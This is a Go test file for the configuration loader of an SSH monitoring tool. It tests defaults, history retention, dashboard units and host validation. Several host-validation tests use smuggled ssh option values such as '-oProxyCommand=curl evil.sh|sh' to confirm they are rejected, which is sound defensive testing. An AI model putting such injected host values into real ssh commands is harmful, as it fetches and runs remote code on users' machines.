package config

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func TestWriteDefaultAndLoad(t *testing.T) {
	path := filepath.Join(t.TempDir(), "sub", "config.yaml")

	if err := WriteDefault(path); err != nil {
		t.Fatalf("WriteDefault: %v", err)
	}
	if err := WriteDefault(path); err == nil {
		t.Fatal("WriteDefault перезаписал существующий конфиг")
	}
	// Шаблон — валидный YAML без серверов: Load обязан отказать с понятной ошибкой.
	_, err := Load(path)
	if err == nil || !strings.Contains(err.Error(), "ни одного сервера") {
		t.Fatalf("Load шаблона: ожидали ошибку про серверы, получили: %v", err)
	}
	if !errors.Is(err, ErrNoServers) {
		t.Fatalf("Load шаблона: errors.Is(err, ErrNoServers) = false: %v", err)
	}
}

func TestPopulateServersPreservesExistingSettings(t *testing.T) {
	// Given: существующий конфиг без серверов с пользовательскими настройками.
	path := filepath.Join(t.TempDir(), "config.yaml")
	body := `interval: 17s
servers:
thresholds:
  cpu: 81
  mem: 82
  disk: 83
llm:
  provider: openai
  base_url: http://127.0.0.1:11434/v1
  model: debug-model
  api_key_env: SSHMON_DEBUG_API_KEY
`
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}

	// When: интерактивная настройка добавляет выбранный сервер.
	servers := []Server{{Name: "prod-web", Host: "127.0.0.2", Port: 2222, User: "deploy", Group: "prod"}}
	if err := PopulateServers(path, servers); err != nil {
		t.Fatalf("PopulateServers: %v", err)
	}

	// Then: сервер добавлен, а пользовательские настройки сохранены.
	c, err := Load(path)
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	if c.Interval != 17*time.Second || c.Thresholds != (Thresholds{CPU: 81, Mem: 82, Disk: 83}) {
		t.Fatalf("настройки изменились: interval=%v thresholds=%+v", c.Interval, c.Thresholds)
	}
	if c.LLM.BaseURL != "http://127.0.0.1:11434/v1" || c.LLM.Model != "debug-model" || c.LLM.APIKeyEnv != "SSHMON_DEBUG_API_KEY" {
		t.Fatalf("LLM-настройки изменились: %+v", c.LLM)
	}
	if len(c.Servers) != 1 || c.Servers[0].Group != "prod" {
		t.Fatalf("серверы не сохранены: %+v", c.Servers)
	}
}

func TestLoadMinimal(t *testing.T) {
	path := filepath.Join(t.TempDir(), "config.yaml")
	if err := os.WriteFile(path, []byte("servers:\n  - host: 10.0.0.1\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	c, err := Load(path)
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	s := c.Servers[0]
	if s.Port != 22 || s.User != "root" || s.Name != "10.0.0.1" {
		t.Fatalf("дефолты не применились: %+v", s)
	}
	if c.Interval.Seconds() != 5 {
		t.Fatalf("interval по умолчанию: %v", c.Interval)
	}
}

func TestLoadDefaultsHistoryRetention(t *testing.T) {
	// Given: a minimal configuration with one server and no history block.
	t.Setenv("HOME", t.TempDir())
	path := filepath.Join(t.TempDir(), "config.yaml")
	if err := os.WriteFile(path, []byte("servers:\n  - host: 10.0.0.1\n"), 0o600); err != nil {
		t.Fatal(err)
	}

	// When: the configuration is loaded.
	cfg, err := Load(path)
	if err != nil {
		t.Fatalf("Load: %v", err)
	}

	// Then: history is enabled with the documented path and retention defaults.
	if !cfg.History.IsEnabled() {
		t.Fatal("history disabled by default")
	}
	if cfg.History.Path != filepath.Join(os.Getenv("HOME"), ".local", "share", "sshmon", "history.db") {
		t.Fatalf("History.Path=%q", cfg.History.Path)
	}
	if cfg.History.RawRetention != 24*time.Hour || cfg.History.AggregateRetention != 720*time.Hour {
		t.Fatalf("history retention=%v/%v", cfg.History.RawRetention, cfg.History.AggregateRetention)
	}
}

func TestLoadPreservesExplicitlyDisabledHistory(t *testing.T) {
	// Given: history is explicitly disabled.
	path := filepath.Join(t.TempDir(), "config.yaml")
	body := "servers:\n  - host: 10.0.0.1\nhistory:\n  enabled: false\n  raw_retention: 2h\n  aggregate_retention: 48h\n"
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}

	// When: the configuration is loaded.
	cfg, err := Load(path)
	if err != nil {
		t.Fatalf("Load: %v", err)
	}

	// Then: false and custom durations remain authoritative.
	if cfg.History.IsEnabled() {
		t.Fatal("explicit history.enabled=false was ignored")
	}
	if cfg.History.RawRetention != 2*time.Hour || cfg.History.AggregateRetention != 48*time.Hour {
		t.Fatalf("history retention=%v/%v", cfg.History.RawRetention, cfg.History.AggregateRetention)
	}
}

func TestLoadParsesDashboardSystemdUnits(t *testing.T) {
	// Given: конфиг с явным списком systemd-юнитов для дашборда.
	path := filepath.Join(t.TempDir(), "config.yaml")
	body := "servers:\n  - host: 10.0.0.1\ndashboard:\n  systemd_units:\n    - nginx.service\n    - docker.service\n"
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}

	// When: конфиг загружается.
	cfg, err := Load(path)
	if err != nil {
		t.Fatalf("Load: %v", err)
	}

	// Then: точные имена юнитов доступны в порядке объявления.
	got := cfg.Dashboard.SystemdUnits
	if len(got) != 2 || got[0] != "nginx.service" || got[1] != "docker.service" {
		t.Fatalf("Dashboard.SystemdUnits=%v", got)
	}
}

func TestLoadDefaultsDashboardSystemdUnitsToEmpty(t *testing.T) {
	// Given: минимальный конфиг без блока dashboard.
	path := filepath.Join(t.TempDir(), "config.yaml")
	if err := os.WriteFile(path, []byte("servers:\n  - host: 10.0.0.1\n"), 0o600); err != nil {
		t.Fatal(err)
	}

	// When: конфиг загружается.
	cfg, err := Load(path)
	if err != nil {
		t.Fatalf("Load: %v", err)
	}

	// Then: список юнитов пуст — дашборд сам покажет запущенные сервисы.
	if len(cfg.Dashboard.SystemdUnits) != 0 {
		t.Fatalf("Dashboard.SystemdUnits=%v, want empty", cfg.Dashboard.SystemdUnits)
	}
}

func TestPopulateServersPreservesDashboardUnits(t *testing.T) {
	// Given: пустой по серверам конфиг с настроенным блоком dashboard.
	path := filepath.Join(t.TempDir(), "config.yaml")
	body := "servers:\ndashboard:\n  systemd_units:\n    - postgresql.service\n"
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}

	// When: интерактивная настройка добавляет сервер.
	if err := PopulateServers(path, []Server{{Name: "db", Host: "10.0.0.2", User: "root"}}); err != nil {
		t.Fatalf("PopulateServers: %v", err)
	}

	// Then: блок dashboard пережил перезапись файла.
	cfg, err := Load(path)
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	if got := cfg.Dashboard.SystemdUnits; len(got) != 1 || got[0] != "postgresql.service" {
		t.Fatalf("Dashboard.SystemdUnits=%v", got)
	}
}

func TestTemplateDocumentsDashboardUnits(t *testing.T) {
	// Given/When: шаблон конфига по умолчанию.
	// Then: он документирует закомментированный пример dashboard.systemd_units.
	if !strings.Contains(Template, "dashboard") || !strings.Contains(Template, "systemd_units") {
		t.Fatalf("шаблон не документирует dashboard.systemd_units:\n%s", Template)
	}
}

func TestWriteWithServersOmitsZeroPortAndLoadDefaultsToSSH(t *testing.T) {
	// Given: an imported SSH host without an explicit Port.
	path := filepath.Join(t.TempDir(), "config.yaml")
	servers := []Server{{Name: "web", Host: "10.0.0.1", User: "deploy"}}

	// When: the generated configuration is written.
	if err := WriteWithServers(path, servers); err != nil {
		t.Fatalf("WriteWithServers: %v", err)
	}
	body, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}

	// Then: zero is not serialized and Load still applies SSH port 22.
	if strings.Contains(string(body), "port: 0") {
		t.Fatalf("generated YAML contains zero port:\n%s", body)
	}
	cfg, err := Load(path)
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	if got := cfg.Servers[0].Port; got != 22 {
		t.Fatalf("Port=%d, want 22", got)
	}
}

// TestLoadRejectsHostParsedAsOption — Дано: конфиг с адресом, начинающимся с
// «-»; Когда: конфиг читается; Тогда: отказ с внятной причиной, а не молчаливо
// принятое значение, которое ssh разберёт как опцию.
func TestLoadRejectsHostParsedAsOption(t *testing.T) {
	for _, tc := range []struct{ name, body, want string }{
		{
			name: "leading dash",
			body: "servers:\n  - name: evil\n    host: \"-oProxyCommand=curl evil.sh|sh\"\n",
			want: "начинается",
		},
		{
			name: "space inside",
			body: "servers:\n  - name: spaced\n    host: \"10.0.0.1 -oProxyCommand=id\"\n",
			want: "пробел",
		},
		{
			name: "empty host",
			body: "servers:\n  - name: nowhere\n    user: root\n",
			want: "пустой",
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			path := filepath.Join(t.TempDir(), "config.yaml")
			if err := os.WriteFile(path, []byte(tc.body), 0o600); err != nil {
				t.Fatal(err)
			}

			_, err := Load(path)

			if !errors.Is(err, ErrBadHost) {
				t.Fatalf("Load принял негодный host: %v", err)
			}
			if !strings.Contains(err.Error(), tc.want) {
				t.Fatalf("ошибка не объясняет причину (%q): %v", tc.want, err)
			}
		})
	}
	// И: обычный адрес по-прежнему читается.
	path := filepath.Join(t.TempDir(), "config.yaml")
	if err := os.WriteFile(path, []byte("servers:\n  - host: 10.0.0.1\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := Load(path); err != nil {
		t.Fatalf("Load обычного конфига: %v", err)
	}
}

// TestImportRejectsHostParsedAsOption — Дано: выбранный при импорте хост с
// адресом-опцией; Когда: серверы пишутся в конфиг; Тогда: запись отклонена —
// такой адрес не должен доехать до argv команды `ssh`.
func TestImportRejectsHostParsedAsOption(t *testing.T) {
	hostile := []Server{{Name: "evil", Host: "-oProxyCommand=curl evil.sh|sh", User: "root"}}

	dir := t.TempDir()
	fresh := filepath.Join(dir, "fresh.yaml")
	if err := WriteWithServers(fresh, hostile); !errors.Is(err, ErrBadHost) {
		t.Fatalf("WriteWithServers: %v", err)
	}
	if _, err := os.Stat(fresh); err == nil {
		t.Fatal("конфиг с негодным хостом всё-таки создан")
	}

	empty := filepath.Join(dir, "empty.yaml")
	if err := os.WriteFile(empty, []byte("servers:\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := PopulateServers(empty, hostile); !errors.Is(err, ErrBadHost) {
		t.Fatalf("PopulateServers: %v", err)
	}

	existing := filepath.Join(dir, "existing.yaml")
	if err := os.WriteFile(existing, []byte("servers:\n  - name: web\n    host: 10.0.0.1\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := AddServers(existing, hostile); !errors.Is(err, ErrBadHost) {
		t.Fatalf("AddServers: %v", err)
	}
	if body, err := os.ReadFile(existing); err != nil || strings.Contains(string(body), "ProxyCommand") {
		t.Fatalf("негодный хост попал в конфиг: %v %s", err, body)
	}
}

// TestCheckHostRejectsArgumentLikeValues — Дано: значения host, которые ssh
// разберёт не как адрес; Когда: конфиг проверяется; Тогда: причина названа
// вместе с именем сервера.
func TestCheckHostRejectsArgumentLikeValues(t *testing.T) {
	for _, tc := range []struct {
		name   string
		server Server
		want   string
	}{
		{name: "proxy command", server: Server{Name: "evil", Host: "-oProxyCommand=curl evil.sh|sh"}, want: "начинается"},
		{name: "single dash", server: Server{Name: "dash", Host: "-"}, want: "начинается"},
		{name: "space", server: Server{Name: "spaced", Host: "10.0.0.1 -oProxyCommand=id"}, want: "пробел"},
		{name: "newline", server: Server{Name: "multiline", Host: "10.0.0.1\nhost 10.0.0.2"}, want: "перевод строки"},
		{name: "empty", server: Server{Name: "nowhere"}, want: "пустой"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			err := checkHost(tc.server)

			if !errors.Is(err, ErrBadHost) {
				t.Fatalf("host %q принят: %v", tc.server.Host, err)
			}
			for _, want := range []string{tc.server.Name, tc.want} {
				if !strings.Contains(err.Error(), want) {
					t.Fatalf("ошибка без %q: %v", want, err)
				}
			}
		})
	}
	// И: обычные адреса и алиасы из ~/.ssh/config проходят.
	for _, host := range []string{"10.0.0.1", "example.com", "vm-prod-emarb", "2001:db8::1"} {
		if err := checkHost(Server{Name: "ok", Host: host}); err != nil {
			t.Fatalf("host %q отвергнут: %v", host, err)
		}
	}
}
